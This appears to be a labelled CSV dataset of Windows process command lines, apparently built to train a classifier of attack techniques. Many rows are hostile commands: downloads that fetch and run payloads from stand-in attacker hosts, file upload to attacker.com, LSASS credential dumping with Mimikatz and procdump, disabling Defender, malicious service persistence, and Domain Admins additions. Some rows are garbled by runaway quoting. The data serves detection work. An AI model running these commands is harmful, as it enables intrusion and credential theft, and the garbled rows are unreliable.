"text","labels"
"(C:\Windows\System32\cmd.exe) -> (C:\Windows\System32\netsh.exe netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=9999 connectaddress=10.0.0.5 connectport=3389)","5"
"(C:\Windows\System32\cmd.exe) -> (C:\Windows\System32\netsh.exe netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.1.100 connectport=80)","5"
"(C:\Windows\System32\cmd.exe) -> (C:\Windows\System32\netsh.exe netsh interface portproxy reset)","5"
"(C:\Windows\System32\cmd.exe /c tasklist > C:\Users\Public\proc_list.txt)","3"
"(C:\Windows\System32\tasklist.exe /svc)","3"
"(C:\Windows\System32\tasklist.exe /v /fo csv > C:\Users\Public\details.csv)","3"
"(C:\\Users\\admin\\Desktop\\report.pdf.exe) -> (C:\\Windows\\System32\\rundll32.exe C:\\Users\\admin\\AppData\\Local\\Temp\\dropper.dll,EntryPoint)","11"
"(C:\\Users\\admin\\Documents\\resume.scr) -> (C:\\Windows\\System32\\powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malware.ps1'))","7;11"
"(C:\\Windows\\System32\\rdpclip.exe) -> (C:\\Windows\\System32\\rdpinput.exe C:\\Windows\\System32\\rdpinput.exe /pid:4560 /handle:1234)","52"
"(C:\\Windows\\System32\\svchost.exe) -> (C:\\Windows\\System32\\rdpclip.exe rdpclip.exe)","52"
"(C:\\Windows\\System32\\winlogon.exe) -> (C:\\Windows\\System32\\rdpclip.exe)","52"
"(C:\\Windows\\System32\\winlogon.exe) -> (C:\\Windows\\System32\\rdpinput.exe /pid:3210 /handle:9999)","52"
"(C:\\Windows\\System32\\services.exe) -> (C:\\Windows\\System32\\rdpclip.exe)","52"
"(C:\\Windows\\explorer.exe) -> (C:\\Windows\\System32\\rdpclip.exe)","52"
"(C:\\Windows\\System32\\taskhostw.exe) -> (C:\\Windows\\System32\\rdpinput.exe /signal:0x1a4)","52"
"(C:\\Windows\\System32\\conhost.exe) -> (C:\\Windows\\System32\\rdpinput.exe /width:120 /height:30 --headless)","52"
"(C:\\Windows\\System32\\net.exe net view /all)","38"
"(C:\\Windows\\System32\\net.exe net view \\10.10.10.5)","38"
"(C:\\Windows\\System32\\net1.exe net1 view)","38"
"(C:\\Windows\\System32\\net1.exe net1 view /all)","38"
"(C:\\Windows\\System32\\net.exe net view /domain)","38"
"(C:\\Windows\\System32\\net.exe net view \\SERVER01)","38"
"(C:\\Windows\\System32\\net.exe net view \\127.0.0.1)","38"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /transfer downloadjob https://evil.com/payload.exe C:\\Users\\Public\\payload.exe)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /create backdoorjob)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /addfile backdoorjob https://malicious.site/dropper.dll C:\\Windows\\Temp\\dropper.dll)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /SetNotifyFlags backdoorjob 0x20)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /resume backdoorjob)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /complete downloadjob)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /cancel stealthjob)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /transfer myjob http://attackersite.xyz/shell.vbs C:\\Temp\\shell.vbs)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /monitor)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\bitsadmin.exe bitsadmin /transfer upjob C:\\Temp\\log.txt http://attacker.com/upload/log.txt)","34"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\net1.exe net1 accounts)","24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\net1.exe net1 accounts /domain)","24"
"(C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command net accounts)","7;24"
"(C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command 'net accounts /domain')","7;24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\net.exe net accounts)","24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\net.exe net accounts /domain)","24"
"(C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command 'Get-ADDefaultDomainPasswordPolicy')","7;24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\dsquery.exe dsquery * -filter "(objectClass=domain)" -attr minPwdLength maxPwdAge lockoutThreshold)","24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\net.exe net group "Domain Admins" /domain)","24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\wmic.exe wmic path Win32_UserAccount get PasswordRequired)","24"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /nologo "C:\\Temp\\enum_users.vbs")","15;18"
"(C:\\Windows\\System32\\explorer.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /B "C:\\Users\\Public\\malicious_script.vbs")","15;18"
"(C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" "C:\\Scripts\\check_service.vbs")","15;18"
"(C:\\Windows\\System32\\services.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /nologo "C:\\ProgramData\\startup.vbs")","15;18"
"(C:\\Windows\\System32\\mshta.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /nologo "C:\\Temp\\launch_payload.vbs")","15;18"
"(C:\\Windows\\System32\\taskhostw.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /B "C:\\Windows\\Temp\\update.vbs")","15;18"
"(C:\\Program Files\\MyApp\\MyAppService.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" "C:\\Logs\\logrotate.vbs")","15;18"
"(C:\\Windows\\System32\\svchost.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /nologo "C:\\Inetpub\\wwwroot\\webshell.vbs")","15;18"
"(C:\\ProgramData\\installer.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /B "C:\\Scripts\\install.vbs")","15;18"
"(C:\\Windows\\System32\\conhost.exe) -> (C:\\Windows\\System32\\cscript.exe "C:\\Windows\\System32\\cscript.exe" /nologo "C:\\Windows\\Tasks\\taskrunner.vbs")","15;18"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe start malicioussvc)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe start PrintSpooler)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe stop WSearch)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe config WinDefend start= disabled)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe qc WinRM)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe delete oldservice)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe start "Backdoor Service")","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe create attacker_svc binPath= "C:\\Malware\\evil.exe" start= auto)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe start attacker_svc)","1"
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\sc.exe sc.exe failure attacker_svc actions= restart/5000/restart/10000/""/60000 reset= 86400)","1"
"$domain = Get-ADDomain -Identity $domainFQDN -ErrorAction Stop;","""9"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Get-WmiObject Win32_Group | Select-Object Name Domain)","""4;7;9;23;29"""
"$Processors = Get-WmiObject -Class Win32_Processor","""2;9;23"""
"$operatingSystem = Get-WmiObject -Class Win32_operatingsystem","""2;9;23"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command (Get-WmiObject -Class Win32_OperatingSystem).Caption)","""2;7;9;23;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command ([ADSI]'WinNT://./Administrators').psbase.Invoke('Members') | ForEach-Object { $_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null) })","""4;7;16;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Get-CimInstance -ClassName Win32_Group)","""4;7;23;29"""
"(""""C:\\\\Windows\\\\System32\\\\cmd.exe"""" /c net localgroup)","""4;6"""
"$Results = Receive-AgentJob -JobName $JobName | fl | Out-String","""12;29"""
"$scriptResult = ScriptExecutionHelper @psboundparameters ;","""12;29"""
"Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, """"Void"""", 0, """""""", $ExeArgs)","""12;29"""
"$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;","""45"""
"$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null","""45"""
"$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000","""45"""
"$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40","""45"""
"""""$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64","""45;14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64","""14"""
"$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32","""14"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Invoke-WebRequest -Uri """"http://malicious.site/commands"""" -OutFile """"task.ps1"""")","""7;13"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Invoke-WebRequest -Uri """"http://c2.example.org/api"""" -Method POST -Body """"status=ready"""") ","""7;13"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command IEX (Invoke-WebRequest 'http://example.com/payload.ps1').Content) ","""7;13"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Start-Sleep -Seconds 30; Invoke-WebRequest -Uri """"http://c2.site/getjob"""")","""7;13"""
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\setspn.exe -a HTTP/websrv.offsec.lan offsec\\\\backupuser) ","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\setspn.exe -L offsec\\\\svcadmin) ","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\setspn.exe -d MSSQLSvc/SQL01.offsec.lan:1433 offsec\\\\devops)","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (C:\\Windows\\System32\\forfiles.exe /M *.txt /C """"cmd /c setspn.exe -a HTTP/%~nF.offsec.lan offsec\\\\%~nF"""") ","""32"""
"(C:\\Windows\\System32\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (setspn.exe -a HOST/webshell.offsec.lan offsec\\\\svc_webshell) ","""7;7;7;7;7;7;7;32"""
"(C:\\Windows\\System32\\cmd.exe) -> (net user offsec\\\\devops /comment:""""Temp elevated account for backup"""") ","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (net user dormantuser /active:yes)","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (net localgroup administrators offsec\\\\supportuser /add) ","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (net group """"Domain Admins"""" offsec\\\\redteam01 /add /domain) ","""32"""
"(C:\\Windows\\System32\\cmd.exe) -> (wmic useraccount where name='honey-pot1' call rename 'svc_update') ","""32"""
"(C:\\Windows\\explorer.exe)  (C:\\Program Files\\Wireshark\\Wireshark.exe)  (C:\\Program Files\\Wireshark\\dumpcap.exe -i 2 -w C:\\captures\\session1.pcapng)","""20"""
"(C:\\Windows\\System32\\cmd.exe)   (C:\\Program Files\\Wireshark\\tshark.exe -i 1 -a duration:60 -w C:\\temp\\dump1.pcap) ","""20"""
"(C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe)   (C:\\Program Files\\Wireshark\\tshark.exe -i \\Device\\NPF_{ABCDE123} -f """"port 80"""" -w """"C:\\logs\\web_traffic.pcap"""")","""7;20"""
"(C:\\Windows\\System32\\svchost.exe -k npcapgroup)   (C:\\Program Files\\Npcap\\NPFInstall.exe)   (C:\\Program Files\\Wireshark\\dumpcap.exe -i 3 -w C:\\logs\\traffic_raw.pcap) ","""20"""
"(C:\\Windows\\System32\\services.exe)   (C:\\Program Files\\Wireshark\\Wireshark.exe)   (C:\\Program Files\\Wireshark\\dumpcap.exe -i \\Device\\NPF_123456 -w C:\\Windows\\Temp\\svc_capture.pcap) ","""20"""
"(C:\\Windows\\System32\\runas.exe /user:admin """"tshark.exe -i 1 -f 'tcp port 443' -w C:\\ssl.pcap"""") ","""20"""
"(C:\\Windows\\System32\\lsass.exe)   (C:\\Tools\\Sysinternals\\procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp) (C:\\Windows\\System32\\conhost.exe) ","""22"""
"(C:\\Windows\\System32\\lsass.exe) (C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command """"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"""") (C:\\Windows\\System32\\conhost.exe) ","""7;22"""
"(C:\\Windows\\System32\\lsass.exe) (\\\\Device\\\\Mup\\\\AttackerShare\\\\tools\\\\dump_lsass.exe None)   (C:\\Windows\\System32\\conhost.exe) ","""22"""
"(C:\\Windows\\System32\\lsass.exe) (C:\\Temp\\nanodump.exe --write C:\\Temp\\out.dmp --duplicate) (C:\\Windows\\System32\\conhost.exe)","""22"""
"(C:\\Windows\\System32\\lsass.exe) (\\\\Device\\\\Mup\\\\VictimPC\\C$\\Tools\\mimi.exe dump)  (C:\\Windows\\System32\\conhost.exe) ","""22"""
"(C:\\Windows\\System32\\lsass.exe)  (C:\\Windows\\System32\\taskmgr.exe) (C:\\Tools\\injector.exe --pid <lsass_pid> --dump) ","""22"""
"(C:\\Windows\\System32\\lsass.exe) (\\\\Device\\\\Mup\\\\Fileshare\\\\dump\\\\sspdumper.exe /dump-lsass) (C:\\Windows\\System32\\conhost.exe) ","""22"""
"(C:\\Windows\\System32\\lsass.exe)  (C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\dump\\lsass.dmp full) (C:\\Windows\\System32\\conhost.exe) ","""22"""
"(C:\\Windows\\System32\\cmd.exe)   (C:\\Python39\\python.exe C:\\Users\\Public\\rev_shell.py) ","""26"""
"(C:\\Windows\\System32\\cmd.exe)   (C:\\Windows\\py.exe C:\\Temp\\agent.py) ","""26"""
"(C:\\Python27\\python.exe -c """"import base64; exec(base64.b64decode('aW1wb3J0IG9z'))"""") ","""26"""
"(powershell.exe -Command Start-Process .\\python3.exe -ArgumentList 'script.py') ","""7;26"""
"(C:\\Windows\\System32\\cmd.exe /c run_payload.bat)  (C:\\Python38\\python.exe payload.py) ","""26"""
"(C:\\Python39\\python.exe -c """"import os; os.system('whoami')"""") ","""25;26"""
"(C:\\Users\\Admin\\AppData\\Local\\Programs\\Python\\Python311\\python.exe) (C:\\Users\\Admin\\Desktop\\c2_controller.py) ","""26"""
"""""(C:\\Python39\\python.exe -c """"import socket; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(1)"""") """" ","""26"""
"(C:\\Windows\\System32\\cmd.exe)  (C:\\Windows\\System32\\dnscmd.exe /config /serverlevelplugindll """"C:\\malware\\evilplugin.dll"""") ","""37"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command systeminfo)","""2;7;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Get-ComputerInfo | Out-File systeminfo.txt)","""2;7;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command (Get-WmiObject -Class Win32_OperatingSystem).Caption)","""2;7;9;23;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Get-WmiObject -Class Win32_BIOS)","""2;7;9;23;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Get-WmiObject Win32_Processor)","""2;7;9;23;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command Get-HotFix)","""2;7;29"""
"(""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""" -Command hostname)","""2;7;29"""
"(powershell  -ExecutionPolicy Bypass -File Trigger_killchain.ps1)   (""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" powershell -Command Get-Process | Out-File ReconProcess.txt ) -""""""""""""""""""""""""""""""""(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -Command Get-Process)","""3;7"""
"(powershell  -ExecutionPolicy Bypass -File Trigger_killchain.ps1)   (""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" powershell -Command Start-Process cmd -ArgumentList '/c whoami /priv' -Verb RunAs )   (""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -Command Start-Process cmd -ArgumentList """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""/c whoami /priv"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -Verb RunAs)","""7;19;25;31"""
"(""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 132 --height 37 --signal 0x1d8 -- """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""")   (c:\\\\windows\\\\system32\\\\cmd.exe)   (net  user)","""6"""
